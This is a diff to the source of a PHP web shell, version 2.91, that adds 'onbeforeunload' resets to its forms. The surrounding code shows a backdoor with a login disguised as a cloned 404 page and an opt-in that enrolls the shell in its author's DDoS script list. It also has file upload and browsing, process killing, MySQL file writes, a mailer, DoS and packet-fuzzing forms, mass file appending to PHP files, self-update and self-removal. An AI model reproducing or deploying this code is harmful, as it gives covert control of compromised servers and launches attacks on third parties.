@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.9;
+$version            = 2.91;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -965,7 +965,7 @@ function shownav(e){
 		</tr>
 	</table>
 	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
-	<form action="" method="post" id="godir" name="godir">
+	<form action="" method="post" id="godir" name="godir" onSubmit="window.onbeforeunload = null;">
 		<tr>
 			<td nowrap>Current Directory (';
     echo $dir_writeable;
@@ -1016,14 +1016,14 @@ function shownav(e){
 	}
     tbhead();
     p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
-    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $nowpath . '" type="hidden" /><input name="dir" value="' . $nowpath . '" type="hidden" /></div></form>');
+    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" onSubmit="window.onbeforeunload = null;"><div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $nowpath . '" type="hidden" /><input name="dir" value="' . $nowpath . '" type="hidden" /></div></form>');
     p('<a href="javascript:godir(\'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');">WebRoot</a>');
     p(' | <a href="javascript:godir(\'' . str_replace('\\', '/', str_replace("'", "\'", getcwd())) . '\');">ScriptPath</a>');
     p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\');">View All</a>');
     p(' | View Writable ( <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'dir\');">Directory</a>');
     p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\',\'file\');">File</a> )');
     p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\'' . str_replace("'", "\'", $nowpath) . '\');">Create File</a>');
-    p('<div style="padding:5px 0;"><form action="' . $self . '" method="POST">Find string in files(current folder): <input onmouseover="this.focus();" class="input" name="findstr" value="' . $findstr . '" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input onmouseover="this.focus();" class="input" name="writabledb" value="' . $writabledb . '" type="text" />');
+    p('<div style="padding:5px 0;"><form action="' . $self . '" method="POST" onSubmit="window.onbeforeunload = null;">Find string in files(current folder): <input onmouseover="this.focus();" class="input" name="findstr" value="' . $findstr . '" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input onmouseover="this.focus();" class="input" name="writabledb" value="' . $writabledb . '" type="text" />');
     makeselect(array('name' => 'findin',
         'option' => array('Find in File Names','Find in File Content'),
         'selected' => $findin,
@@ -1092,7 +1092,7 @@ function shownav(e){
         unset($filedb);
         @closedir($dirs);
     }
-    p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
+    p('<form id="filelist" name="filelist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
     makehide('action', 'file');
     makehide('thefile');
     makehide('doing');
@@ -1308,7 +1308,7 @@ formhead(array(
     makehide('doing');
     makehide('pid');
     formfoot();
-	p('<form id="proclist" name="proclist" action="' . $self . '" method="post">');
+	p('<form id="proclist" name="proclist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
     makehide('doing','killproc');
 	if ($doing == 'killproc') {
         if ($pid) {
@@ -1505,7 +1505,7 @@ function mysqlfile(doing){
     ));
     p('</p>');
     formfoot();
-    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
+    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile" onSubmit="window.onbeforeunload = null;">');
     p('<h2>Upload file</h2>');
     p('<p><b>This operation the DB user must has FILE privilege</b></p>');
     p('<p>Save path(fullpath): <input onmouseover="this.focus();" class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
@@ -2092,7 +2092,7 @@ function mysqlfile(doing){
     );
     if (empty($ajax) && !empty($p1))
         $_SESSION[$prefixme . md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
-    echo "<form name='toolsForm' method='post'>";
+    echo "<form name='toolsForm' method='post' onSubmit=\"window.onbeforeunload = null;\">";
     makehide('action', 'stringtools');
     echo "<select name='selectTool'>";
     foreach ($stringTools as $k => $v)
@@ -2160,7 +2160,7 @@ function insertAfter(referenceNode, newNode) {
     referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
 }
 </script>
-<form method="post" enctype="multipart/form-data">
+<form method="post" enctype="multipart/form-data" onSubmit="window.onbeforeunload = null;">
 <table width="100%">
 	<tr>
 	<td>To:</td>
@@ -2237,7 +2237,7 @@ function insertAfter(referenceNode, newNode) {
         } else {
             echo "Shell is up to date! Thank you for checking!";
         }
-        echo '<br/><form method="POST"><input type="hidden" name="force" value="true"><input type="submit" value="Force Update">';
+        echo '<br/><form method="POST" onSubmit="window.onbeforeunload = null;"><input type="hidden" name="force" value="true"><input type="submit" value="Force Update">';
         makehide("action", "checkupdates");
         echo "</form>";
     } else {
@@ -2301,7 +2301,7 @@ function insertAfter(referenceNode, newNode) {
         echo "Total Data Sent: " . sizecount($packets * $noOfBytes) . "<br/>";
         echo "Data per packet: " . sizecount($noOfBytes) . "<br/>";
     } else {
-echo '<form method="POST">
+echo '<form method="POST" onSubmit="window.onbeforeunload = null;">
            <input type="hidden" name="dos" />
                        IP
                        <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == \'127.0.0.1\')this.value = ;" onblur="if(this.value==)this.value=\'127.0.0.1\';"/>
@@ -2356,7 +2356,7 @@ formhead(array(
         echo "Data per packet: " . sizecount($length) . "<br/>";
     } else {
 ?>
-       <form method="POST">
+       <form method="POST" onSubmit="window.onbeforeunload = null;">
            <input type="hidden" name="fuzz" />
                        IP
                        <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = ;" onblur="if(this.value==)this.value='127.0.0.1';"/>
@@ -2417,7 +2417,7 @@ formhead(array(
         }
     } else {
         echo '
-<form method=\'POST\'>
+<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
                        Directory<input onmouseover="this.focus();" class="cmd" name="dir" value="' . $nowpath . '" />
                        File Type
                        <input onmouseover="this.focus();" type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value==)this.value=\'.php\';" /><br/>
@@ -2460,7 +2460,7 @@ formhead(array(
         }
     } else {
         echo '
-<form method=\'POST\'>
+<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
                        Directory<input onmouseover="this.focus();" class="cmd" name="dir" value="' . $nowpath . '" />
                    Mode<select style="width: 400px;" name="mode" class="cmd">
                            <option value="Append">Append</option>
@@ -2501,7 +2501,7 @@ maketext(array(
     	formhead(array(
         'title' => 'Are you sure you want to delete this shell?'
     ));
-        echo "<form name='ds' method='post'>";
+        echo "<form name='ds' method='post' onSubmit=\"window.onbeforeunload = null;\">";
         makehide('action', 'SelfRemove');
         echo "<input class='bt' type='submit' name='SelfRemoveSure' value='Yes'><input class='bt' type='submit' name='SelfRemoveSure' value='No'></form>";
     } else {
@@ -3148,7 +3148,7 @@ function loginpage($aep)
 		input { margin:0;background-color:transparent;border:0px solid #fff; }
 	</style>
 	<center>
-	<form method="post">
+	<form method="post" onSubmit="window.onbeforeunload = null;">
 	<input type="password" name="password">
 	<input type="hidden" name="action" value="login">
 	</form></center>';
@@ -3617,7 +3617,7 @@ function formfooter($name = '')
 function goback()
 {
     global $self, $nowpath;
-    p('<form action="' . $self . '" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="' . $nowpath . '" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
+    p('<form action="' . $self . '" method="post" onSubmit="window.onbeforeunload = null;"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="' . $nowpath . '" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
 }
 function formfoot()
 {
